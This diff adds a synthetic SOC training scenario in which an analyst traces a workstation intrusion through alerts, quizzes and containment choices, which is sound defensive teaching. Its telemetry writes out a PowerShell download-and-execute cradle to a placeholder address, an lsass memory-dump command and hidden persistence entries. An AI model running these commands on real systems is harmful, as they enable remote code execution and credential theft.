@@ -1,0 +1,693 @@
+slug: compromised-developer-workstation
+title: Compromised Developer Workstation
+summary: >
+  A developer's workstation is reached over remote desktop with valid credentials. Within eleven
+  minutes the intruder runs encoded PowerShell, pulls a second stage, tries to dump credentials,
+  probes a file server over SMB and plants persistence. Follow the alerts and decide when to act.
+difficulty: intermediate
+duration_minutes: 25
+order: 1
+domain: endpoint
+tags: [windows, powershell, credential-access, lateral-movement, persistence]
+briefing: >
+  At 08:43 the SOC queue receives a medium-severity alert for DEV-WKS-07, a developer workstation
+  in the engineering VLAN. The user, Mei Chen (CORP\mchen), is listed as on leave until Monday.
+  You are the on-call analyst. Start with the alert, work through the telemetry as it arrives and
+  decide how far to trust what you see before you act. All data in this story is synthetic.
+
+attack_chain:
+  - tactic: Initial Access
+    technique: T1078
+    step: rdp-logon
+    description: The intruder signs in over remote desktop with mchen's valid credentials from a public address.
+  - tactic: Execution
+    technique: T1059.001
+    step: encoded-powershell
+    description: A hidden PowerShell process runs an encoded command to avoid simple command-line matching.
+  - tactic: Command and Control
+    technique: T1105
+    step: download-stage
+    description: PowerShell downloads and evaluates a second-stage script from an external address.
+  - tactic: Credential Access
+    technique: T1003.001
+    step: credential-dump
+    description: A memory dump of the authentication process is attempted with a signed system library.
+  - tactic: Lateral Movement
+    technique: T1021.002
+    step: smb-probe
+    description: The stolen session opens administrative shares on a file server.
+  - tactic: Persistence
+    technique: T1547.001
+    step: persistence
+    description: A Run key and a scheduled task re-launch a hidden script at logon and on a timer.
+
+steps:
+  - id: rdp-logon
+    time: "08:41"
+    title: Suspicious authentication
+    narrative: >
+      The alert that opened the ticket: a remote-interactive logon to DEV-WKS-07 as CORP\mchen. Two
+      failed attempts come from the same address just before it.
+    telemetry:
+      - t: 0
+        category: windows_security
+        host: DEV-WKS-07
+        fields:
+          {
+            EventID: 4625,
+            LogonType: 10,
+            IpAddress: 203.0.113.60,
+            TargetUserName: mchen,
+            TargetDomainName: CORP,
+            Status: "0xC000006A",
+          }
+        note: A wrong password from a public address.
+      - t: 14
+        category: windows_security
+        host: DEV-WKS-07
+        fields:
+          {
+            EventID: 4625,
+            LogonType: 10,
+            IpAddress: 203.0.113.60,
+            TargetUserName: mchen,
+            TargetDomainName: CORP,
+            Status: "0xC000006A",
+          }
+        note: A second wrong password.
+      - t: 41
+        category: windows_security
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          {
+            EventID: 4624,
+            LogonType: 10,
+            IpAddress: 203.0.113.60,
+            TargetUserName: mchen,
+            TargetDomainName: CORP,
+          }
+        note: The third attempt succeeds.
+    evidence:
+      - id: logon-sequence
+        title: Logon sequence for mchen on DEV-WKS-07
+        kind: log
+        significance: key
+        content: |
+          08:41:00  4625  mchen  LogonType=10  Source=203.0.113.60  Status=0xC000006A (bad password)
+          08:41:14  4625  mchen  LogonType=10  Source=203.0.113.60  Status=0xC000006A (bad password)
+          08:41:41  4624  mchen  LogonType=10  Source=203.0.113.60  (success)
+        finding: A successful remote-desktop logon from a public address, immediately after two bad passwords.
+      - id: hr-roster
+        title: HR leave roster (excerpt)
+        kind: ticket
+        significance: key
+        content: |
+          mchen  Mei Chen  Engineering  On leave 2026-03-09 .. 2026-03-13  (travelling, no remote work approved)
+        finding: The account owner should not be working today, which turns an odd logon into a strong signal.
+      - id: vpn-note
+        title: Remote-access policy
+        kind: note
+        significance: supporting
+        content: Developer workstations are reachable only through the corporate VPN. Direct remote desktop from the internet is not part of the design.
+    detections: [win-rdp-logon-from-public-address]
+    alert:
+      title: Remote desktop logon from a public address
+      severity: high
+      rule: win-rdp-logon-from-public-address
+    techniques: [T1078]
+    questions:
+      - id: q-logon
+        prompt: Which detail makes this logon most suspicious?
+        options:
+          - id: a
+            text: The logon type is remote-interactive (10) from a public address, on a host that should sit behind the VPN.
+            correct: true
+            explanation: Logon type 10 from 203.0.113.60 means someone reached the workstation directly from outside. That contradicts the remote-access policy.
+          - id: b
+            text: It happened at 08:41, which is outside working hours.
+            explanation: 08:41 is an ordinary time to start work, so timing tells you nothing here.
+          - id: c
+            text: The username exists in the directory.
+            explanation: The account being valid is exactly what makes it useful to an attacker. It is not what makes the logon suspicious.
+        hint: Look at the logon type and the source address, then compare with the policy in the evidence.
+    graph_nodes:
+      - { id: ip-intruder, type: ip, label: "203.0.113.60" }
+      - { id: host-dev, type: host, label: DEV-WKS-07 }
+      - { id: user-mchen, type: user, label: 'CORP\mchen' }
+      - {
+          id: det-rdp,
+          type: detection,
+          label: RDP from a public address,
+          ref: win-rdp-logon-from-public-address,
+        }
+      - { id: alert-rdp, type: alert, label: RDP logon from public address }
+      - { id: tech-valid, type: technique, label: Valid Accounts, ref: T1078 }
+    graph_edges:
+      - { source: ip-intruder, target: host-dev, relation: connected to }
+      - { source: user-mchen, target: host-dev, relation: associated with }
+      - { source: det-rdp, target: alert-rdp, relation: triggered }
+      - { source: det-rdp, target: tech-valid, relation: mapped to }
+      - { source: alert-rdp, target: host-dev, relation: associated with }
+
+  - id: encoded-powershell
+    time: "08:44"
+    title: PowerShell execution
+    narrative: >
+      Three minutes later the session starts a command shell and launches PowerShell with hidden
+      window and an encoded command.
+    telemetry:
+      - t: 5
+        category: process_creation
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          Image: 'C:\Windows\System32\cmd.exe'
+          ParentImage: 'C:\Windows\explorer.exe'
+          CommandLine: "cmd.exe"
+          IntegrityLevel: Medium
+        note: An interactive shell opened from the desktop session.
+      - t: 22
+        category: process_creation
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          OriginalFileName: PowerShell.EXE
+          ParentImage: 'C:\Windows\System32\cmd.exe'
+          CommandLine: "powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACAAcwBpAG0AdQBsAGEAdABpAG8AbgAnAA== "
+          IntegrityLevel: Medium
+        note: Hidden window, no profile, encoded command. The Base64 decodes (UTF-16LE) to a harmless Write-Output line.
+    evidence:
+      - id: process-chain
+        title: Process chain
+        kind: process-tree
+        significance: key
+        content: |
+          explorer.exe                       (mchen, RDP session)
+            └─ cmd.exe
+                 └─ powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBi...
+        finding: An interactive shell launching hidden, encoded PowerShell is a hands-on-keyboard pattern, not a scheduled task.
+      - id: decoded-command
+        title: Decoded command (analyst note)
+        kind: note
+        significance: supporting
+        content: "Decoding the Base64 as UTF-16LE gives: Write-Output 'lab simulation'. The payload is harmless in this exercise; in a real case decoding it is the first step."
+      - id: dev-baseline
+        title: Baseline for developers' PowerShell use
+        kind: note
+        significance: noise
+        content: Developers here normally run PowerShell from Windows Terminal without -enc and without -w hidden.
+    detections: [win-encoded-powershell-command]
+    alert:
+      title: PowerShell launched with an encoded command
+      severity: high
+      rule: win-encoded-powershell-command
+    techniques: [T1059.001]
+    questions:
+      - id: q-enc
+        prompt: Why do attackers encode PowerShell commands?
+        options:
+          - id: a
+            text: It hides the script text from casual inspection and naive command-line matching.
+            correct: true
+            explanation: -EncodedCommand takes Base64, so keyword searches of the command line miss the real content. It does not make the code safe or unreadable to a defender who decodes it.
+          - id: b
+            text: It makes the script run faster.
+            explanation: Encoding adds a decoding step and has no performance benefit.
+          - id: c
+            text: It is required by Windows for scripts longer than 100 characters.
+            explanation: Nothing forces encoding. It is a choice, usually made to evade detection or to survive quoting problems.
+    decision:
+      id: d-isolate
+      prompt: Two suspicious steps in three minutes on a user who is on leave. What do you do first?
+      context: The workstation holds source code and CI tokens. Isolating it stops the session but also drops your ability to watch live.
+      options:
+        - id: isolate
+          text: Isolate DEV-WKS-07 with the EDR agent (network contained, machine left on) and keep collecting telemetry.
+          quality: best
+          feedback: Containment that preserves memory and logs stops further damage while keeping evidence. This is the right balance when the account owner cannot be reached.
+        - id: disable
+          text: Disable the mchen account and keep watching the host.
+          quality: acceptable
+          feedback: Disabling the account helps against new logons but does nothing about processes already running in the existing session.
+        - id: wait
+          text: Wait for more evidence. It might be an admin task.
+          quality: poor
+          feedback: An encoded, hidden PowerShell in a session from a public address, for a user on leave, is enough to act. Waiting gives the intruder time.
+    graph_nodes:
+      - { id: proc-cmd, type: process, label: cmd.exe }
+      - { id: proc-ps, type: process, label: powershell.exe -enc }
+      - {
+          id: det-enc,
+          type: detection,
+          label: Encoded PowerShell,
+          ref: win-encoded-powershell-command,
+        }
+      - { id: alert-enc, type: alert, label: Encoded PowerShell command }
+      - { id: tech-ps, type: technique, label: PowerShell, ref: T1059.001 }
+    graph_edges:
+      - { source: user-mchen, target: proc-cmd, relation: executed }
+      - { source: proc-cmd, target: proc-ps, relation: executed }
+      - { source: det-enc, target: alert-enc, relation: triggered }
+      - { source: det-enc, target: tech-ps, relation: mapped to }
+      - { source: alert-enc, target: proc-ps, relation: associated with }
+      - { source: proc-ps, target: host-dev, relation: associated with }
+
+  - id: download-stage
+    time: "08:45"
+    title: External download
+    narrative: >
+      The PowerShell process reaches out to an external address and evaluates what it receives.
+    telemetry:
+      - t: 10
+        category: dns_query
+        host: DEV-WKS-07
+        fields: { src_ip: 10.20.4.17, query: stage.cdn-lab.example, record_type: A, rcode: NOERROR }
+        note: The workstation resolves an unfamiliar name.
+      - t: 12
+        category: firewall
+        host: fw-edge-01
+        fields:
+          {
+            src_ip: 10.20.4.17,
+            dst_ip: 198.51.100.10,
+            dst_port: 80,
+            proto: TCP,
+            action: allow,
+            bytes: 18344,
+          }
+        note: An outbound connection to the resolved address is allowed.
+      - t: 14
+        category: process_creation
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          OriginalFileName: PowerShell.EXE
+          ParentImage: 'C:\Windows\System32\cmd.exe'
+          CommandLine: 'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(''http://198.51.100.10/stage.ps1''))"'
+          IntegrityLevel: Medium
+        note: A download-and-execute cradle. The URL uses a documentation address; nothing is fetched here.
+    evidence:
+      - id: cradle
+        title: Command line of the second PowerShell
+        kind: log
+        significance: key
+        content: |
+          powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString('http://198.51.100.10/stage.ps1'))"
+        finding: "A download cradle: fetch text from a remote host and execute it immediately, leaving no file for antivirus to scan."
+      - id: network-flow
+        title: Firewall and DNS for the same minute
+        kind: network
+        significance: supporting
+        content: |
+          08:45:10  DNS    10.20.4.17 -> stage.cdn-lab.example  A  NOERROR
+          08:45:12  ALLOW  10.20.4.17 -> 198.51.100.10:80/tcp   18,344 bytes
+        finding: The name, address and byte count give you indicators to hunt for on other hosts.
+    detections: [win-powershell-download-cradle]
+    alert:
+      title: PowerShell download cradle
+      severity: high
+      rule: win-powershell-download-cradle
+    techniques: [T1105]
+    questions:
+      - id: q-ioc
+        prompt: Which indicators would you search for across the estate right now? Select all that apply.
+        kind: multiple
+        options:
+          - id: a
+            text: The destination address 198.51.100.10
+            correct: true
+            explanation: Any other host talking to this address may be compromised too.
+          - id: b
+            text: The domain stage.cdn-lab.example
+            correct: true
+            explanation: DNS logs let you find hosts that resolved the name even if they connected over another path.
+          - id: c
+            text: The account name mchen
+            correct: true
+            explanation: Other sessions for this account, at other hosts, show how far the stolen credentials reached.
+          - id: d
+            text: The word powershell
+            explanation: Far too common to be an indicator. You would drown in legitimate results.
+    graph_nodes:
+      - { id: dom-stage, type: domain, label: stage.cdn-lab.example }
+      - { id: ip-stage, type: ip, label: "198.51.100.10" }
+      - {
+          id: det-cradle,
+          type: detection,
+          label: Download cradle,
+          ref: win-powershell-download-cradle,
+        }
+      - { id: alert-cradle, type: alert, label: PowerShell download cradle }
+      - { id: tech-ingress, type: technique, label: Ingress Tool Transfer, ref: T1105 }
+    graph_edges:
+      - { source: proc-ps, target: dom-stage, relation: connected to }
+      - { source: dom-stage, target: ip-stage, relation: associated with }
+      - { source: proc-ps, target: ip-stage, relation: connected to }
+      - { source: det-cradle, target: alert-cradle, relation: triggered }
+      - { source: det-cradle, target: tech-ingress, relation: mapped to }
+      - { source: alert-cradle, target: proc-ps, relation: associated with }
+
+  - id: credential-dump
+    time: "08:47"
+    title: Credential access attempt
+    narrative: >
+      A signed system library is used to write a memory dump of a process, and another process
+      opens the authentication service with read-memory rights.
+    telemetry:
+      - t: 20
+        category: process_creation
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          Image: 'C:\Windows\System32\rundll32.exe'
+          ParentImage: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          CommandLine: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\d.dmp full'
+          IntegrityLevel: High
+        note: A memory dump of process 704 (the authentication process in this story) written to a temp folder.
+      - t: 21
+        category: process_access
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          SourceImage: 'C:\Windows\System32\rundll32.exe'
+          TargetImage: 'C:\Windows\System32\lsass.exe'
+          GrantedAccess: "0x1410"
+        note: rundll32 opens the authentication process with rights that allow reading its memory.
+    evidence:
+      - id: dump-cmd
+        title: Dump command and target
+        kind: log
+        significance: key
+        content: |
+          rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\d.dmp full
+          process 704 = lsass.exe (from the process table snapshot)
+        finding: A MiniDump call against lsass is a well-known way to extract credentials without dropping a tool.
+      - id: access-mask
+        title: Process access event
+        kind: log
+        significance: supporting
+        content: |
+          SourceImage   C:\Windows\System32\rundll32.exe
+          TargetImage   C:\Windows\System32\lsass.exe
+          GrantedAccess 0x1410  (PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ)
+        finding: VM_READ on lsass from an unexpected process is what the dump needs.
+      - id: av-verdict
+        title: Endpoint protection verdict
+        kind: alert
+        significance: noise
+        content: "No detection. rundll32.exe and comsvcs.dll are both signed Microsoft binaries."
+    detections: [win-lsass-memory-dump-command-line, win-lsass-process-access]
+    alert:
+      title: Possible LSASS memory dump
+      severity: critical
+      rule: win-lsass-memory-dump-command-line
+    techniques: [T1003.001]
+    questions:
+      - id: q-creds
+        prompt: Assume the dump succeeded. What must be treated as compromised?
+        options:
+          - id: a
+            text: Every credential that was in memory on DEV-WKS-07, including any administrator who logged on there.
+            correct: true
+            explanation: The dump contains hashes and tickets for every session on the machine. Scope the reset by who has logged on, not just by mchen.
+          - id: b
+            text: Only the mchen password.
+            explanation: mchen is the account the intruder used, but the dump also holds anyone else who signed in to this host.
+          - id: c
+            text: Nothing, because the dump is in a temp folder.
+            explanation: The file location does not matter. It can be copied out in seconds.
+    graph_nodes:
+      - { id: proc-rundll, type: process, label: rundll32.exe comsvcs MiniDump }
+      - { id: proc-lsass, type: process, label: lsass.exe }
+      - {
+          id: det-lsass,
+          type: detection,
+          label: LSASS dump command line,
+          ref: win-lsass-memory-dump-command-line,
+        }
+      - { id: alert-lsass, type: alert, label: Possible LSASS memory dump }
+      - { id: tech-lsass, type: technique, label: LSASS Memory, ref: T1003.001 }
+    graph_edges:
+      - { source: proc-ps, target: proc-rundll, relation: executed }
+      - { source: proc-rundll, target: proc-lsass, relation: connected to }
+      - { source: det-lsass, target: alert-lsass, relation: triggered }
+      - { source: det-lsass, target: tech-lsass, relation: mapped to }
+      - { source: alert-lsass, target: proc-rundll, relation: associated with }
+
+  - id: smb-probe
+    time: "08:49"
+    title: Unusual SMB activity
+    narrative: >
+      Now the file server logs administrative-share access from the developer's workstation address,
+      using mchen's account.
+    telemetry:
+      - t: 6
+        category: windows_security
+        host: SRV-FILE01
+        user: 'CORP\mchen'
+        fields:
+          {
+            EventID: 4624,
+            LogonType: 3,
+            IpAddress: 10.20.4.17,
+            TargetUserName: mchen,
+            TargetDomainName: CORP,
+          }
+        note: A network logon to the file server from the workstation.
+      - t: 9
+        category: windows_security
+        host: SRV-FILE01
+        fields:
+          { EventID: 5140, SubjectUserName: mchen, IpAddress: 10.20.4.17, ShareName: '\\*\ADMIN$' }
+        note: The ADMIN$ share is opened. This share exists for administrators.
+      - t: 12
+        category: windows_security
+        host: SRV-FILE01
+        fields:
+          { EventID: 5140, SubjectUserName: mchen, IpAddress: 10.20.4.17, ShareName: '\\*\C$' }
+        note: Then the C$ share.
+    evidence:
+      - id: share-access
+        title: Share access on SRV-FILE01
+        kind: log
+        significance: key
+        content: |
+          08:49:06  4624  mchen  LogonType=3   Source=10.20.4.17
+          08:49:09  5140  mchen  Share=\\*\ADMIN$  Source=10.20.4.17
+          08:49:12  5140  mchen  Share=\\*\C$      Source=10.20.4.17
+        finding: A developer account with no administrative role touching ADMIN$ and C$ on a file server is out of pattern.
+      - id: role-check
+        title: mchen's roles
+        kind: ticket
+        significance: supporting
+        content: "mchen: Developers, Engineering-VPN. Not a member of any server administration group."
+        finding: Reading an admin share should not even succeed for this account. Check why it did.
+    detections: [win-admin-share-access-from-workstation]
+    alert:
+      title: Administrative share accessed by a user account
+      severity: medium
+      rule: win-admin-share-access-from-workstation
+    techniques: [T1021.002]
+    questions:
+      - id: q-smb
+        prompt: mchen is not an administrator, yet the share opened. What is the most likely explanation?
+        options:
+          - id: a
+            text: The intruder has already obtained a more privileged credential, or the share permissions are too broad.
+            correct: true
+            explanation: "Both point to the same next steps: check share ACLs and look for a privileged logon on this workstation. The dump attempt one step earlier makes the first reading likely."
+          - id: b
+            text: The alert is a false positive because file servers always use SMB.
+            explanation: SMB is normal; administrative shares opened by a non-admin user account are not.
+          - id: c
+            text: mchen legitimately maps the C$ share for builds.
+            explanation: There is no support for this in the evidence, and the account is on leave.
+    decision:
+      id: d-scope
+      prompt: The file server is now involved. What is the priority?
+      options:
+        - id: hunt
+          text: Search for the indicators (address, domain, account) across the estate and check SRV-FILE01 for new services or files.
+          quality: best
+          feedback: Scoping matters more than deepening on one host. The intruder has already moved once.
+        - id: reimage
+          text: Re-image DEV-WKS-07 immediately.
+          quality: poor
+          feedback: Re-imaging destroys memory and disk evidence and does nothing about SRV-FILE01. Containment first, forensics second, rebuild last.
+        - id: wait-more
+          text: Only monitor SRV-FILE01 for a while.
+          quality: acceptable
+          feedback: Monitoring is fine as an addition, but by itself it leaves the intruder free to keep moving.
+    graph_nodes:
+      - { id: host-file, type: host, label: SRV-FILE01 }
+      - {
+          id: det-smb,
+          type: detection,
+          label: Admin share access,
+          ref: win-admin-share-access-from-workstation,
+        }
+      - { id: alert-smb, type: alert, label: Admin share accessed by a user }
+      - { id: tech-smb, type: technique, label: SMB/Windows Admin Shares, ref: T1021.002 }
+    graph_edges:
+      - { source: host-dev, target: host-file, relation: connected to }
+      - { source: user-mchen, target: host-file, relation: associated with }
+      - { source: det-smb, target: alert-smb, relation: triggered }
+      - { source: det-smb, target: tech-smb, relation: mapped to }
+      - { source: alert-smb, target: host-file, relation: associated with }
+
+  - id: persistence
+    time: "08:52"
+    title: Persistence simulation
+    narrative: >
+      Back on the workstation, two mechanisms appear that will relaunch a hidden script: a Run key
+      and a scheduled task.
+    telemetry:
+      - t: 15
+        category: registry_set
+        host: DEV-WKS-07
+        user: 'CORP\mchen'
+        fields:
+          Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          TargetObject: 'HKU\S-1-5-21-3000\Software\Microsoft\Windows\CurrentVersion\Run\DevSync'
+          Details: 'powershell.exe -w hidden -File C:\Users\mchen\AppData\Roaming\devsync.ps1'
+        note: A Run value that launches a script from the user's profile at every logon.
+      - t: 40
+        category: windows_security
+        host: DEV-WKS-07
+        fields:
+          EventID: 4698
+          SubjectUserName: mchen
+          TaskName: '\Microsoft\Windows\DevSync'
+          TaskContent: '<Exec><Command>powershell.exe</Command><Arguments>-w hidden -File C:\Users\Public\devsync.ps1</Arguments></Exec>'
+        note: A scheduled task with a name that imitates a Windows one, running a script from a public folder.
+    evidence:
+      - id: run-key
+        title: Registry value and task definition
+        kind: log
+        significance: key
+        content: |
+          HKU\...\CurrentVersion\Run\DevSync = powershell.exe -w hidden -File C:\Users\mchen\AppData\Roaming\devsync.ps1
+          Task \Microsoft\Windows\DevSync -> powershell.exe -w hidden -File C:\Users\Public\devsync.ps1
+        finding: Two independent persistence mechanisms mean removing one will not end the intrusion.
+      - id: timeline-so-far
+        title: Timeline so far
+        kind: note
+        significance: supporting
+        content: |
+          08:41 logon from public address     08:44 encoded PowerShell
+          08:45 download cradle               08:47 LSASS dump attempt
+          08:49 admin shares on SRV-FILE01    08:52 persistence (this step)
+    detections: [win-run-key-persistence-set, win-scheduled-task-with-script-payload]
+    alert:
+      title: Persistence via Run key and scheduled task
+      severity: high
+      rule: win-run-key-persistence-set
+    techniques: [T1547.001, T1053.005]
+    questions:
+      - id: q-persist
+        prompt: What does the presence of two persistence mechanisms tell you?
+        options:
+          - id: a
+            text: The intruder expects to stay, and eradication must remove every mechanism, not just the first one found.
+            correct: true
+            explanation: Redundant persistence is a sign of intent. A checklist that ends at the first Run key leaves the scheduled task behind.
+          - id: b
+            text: The intrusion is over, because persistence is set up last.
+            explanation: Persistence is set up when the intruder wants to survive a reboot or a lost session, not when finished.
+          - id: c
+            text: Nothing, both entries are standard Windows.
+            explanation: Both point at PowerShell running a hidden script from a user-writable path, which Windows does not do by default.
+    graph_nodes:
+      - {
+          id: det-runkey,
+          type: detection,
+          label: Run key persistence,
+          ref: win-run-key-persistence-set,
+        }
+      - { id: alert-persist, type: alert, label: Persistence via Run key }
+      - { id: tech-runkey, type: technique, label: Registry Run Keys, ref: T1547.001 }
+    graph_edges:
+      - { source: proc-ps, target: host-dev, relation: executed }
+      - { source: det-runkey, target: alert-persist, relation: triggered }
+      - { source: det-runkey, target: tech-runkey, relation: mapped to }
+      - { source: alert-persist, target: host-dev, relation: associated with }
+
+containment:
+  - id: isolate-host
+    action: Isolate DEV-WKS-07 with the EDR agent
+    category: isolate
+    quality: recommended
+    effect: Stops the session and outbound connections while keeping memory and disk for forensics.
+    feedback: Correct. Isolation, not power-off or re-image, preserves evidence and cuts the intruder off.
+  - id: reset-mchen
+    action: Reset mchen's password and revoke active sessions and tokens
+    category: credentials
+    quality: recommended
+    effect: Removes the stolen credential from use, including cached tickets and CI tokens.
+    feedback: Required. The credentials are known to be in intruder hands.
+  - id: reset-admins
+    action: Reset credentials of every account that logged on to DEV-WKS-07 recently
+    category: credentials
+    quality: recommended
+    effect: Covers accounts exposed by the LSASS dump attempt, not just the one that was used.
+    feedback: Correct. A dump exposes everyone on the host.
+  - id: block-indicators
+    action: Block 198.51.100.10 and stage.cdn-lab.example at the edge, and search logs for both
+    category: block
+    quality: recommended
+    effect: Stops reuse of the staging server and reveals other victims.
+    feedback: Good. Blocking is cheap and hunting on the same indicators finds scope.
+  - id: remove-persistence
+    action: Remove the Run key and the scheduled task, then hunt for similar entries on SRV-FILE01
+    category: eradicate
+    quality: recommended
+    effect: Ends the foothold. Do it after isolation so the intruder cannot re-create it.
+    feedback: "Correct, and in the right order: contain first, then eradicate."
+  - id: reimage-now
+    action: Wipe and re-image DEV-WKS-07 right away
+    category: eradicate
+    quality: harmful
+    effect: Removes all evidence of what the intruder read and copied before you understand the scope.
+    feedback: Too early. Take a memory and disk image first; rebuild once the investigation no longer needs the host.
+  - id: notify-user
+    action: Tell mchen by email that their account is compromised
+    category: communicate
+    quality: harmful
+    effect: The account is being used by the intruder, who may read the mailbox and learn they were detected.
+    feedback: Use an out-of-band channel (phone, or the manager) instead. Email to a compromised account alerts the intruder.
+  - id: monitor
+    action: Add a watchlist for the account, address and domain
+    category: monitor
+    quality: optional
+    effect: Catches reuse of the same indicators.
+    feedback: Useful as a follow-up but not a substitute for containment.
+
+postmortem:
+  summary: >
+    An intruder used a valid developer credential over an exposed remote-desktop path, ran
+    encoded PowerShell, fetched a second stage, tried to dump credentials, probed a file server's
+    administrative shares and installed two persistence mechanisms, all within eleven minutes.
+    Six detections fired; the first alert alone was enough to justify isolating the host.
+  root_cause: >
+    A developer workstation was reachable by remote desktop from the internet, protected only by a
+    password that had been guessed or reused. Nothing required a second factor.
+  what_worked:
+    - The public-address RDP rule fired within a minute of the logon.
+    - Process-chain telemetry (parent and child) made the PowerShell activity unambiguous.
+    - Several independent detections agreed, which raised confidence quickly.
+  what_to_improve:
+    - Remove direct remote-desktop exposure and require the VPN plus multi-factor authentication.
+    - Alert on failed-then-successful logons for accounts that are on leave.
+    - Restrict administrative shares so a developer account cannot open them.
+    - Enable LSASS protection so the memory dump fails.
+  detections_to_add:
+    - Successful logon following failed logons from the same public address.
+    - Access to administrative shares from workstation address ranges.
+  lessons:
+    - The first alert is often the cheapest place to stop an intrusion.
+    - Chains of weak signals (logon, PowerShell, download, dump) are stronger than any one of them.
+    - "Contain before you rebuild: evidence disappears when a machine is wiped."
+    - A credential dump attempt widens the scope to every account on the host.
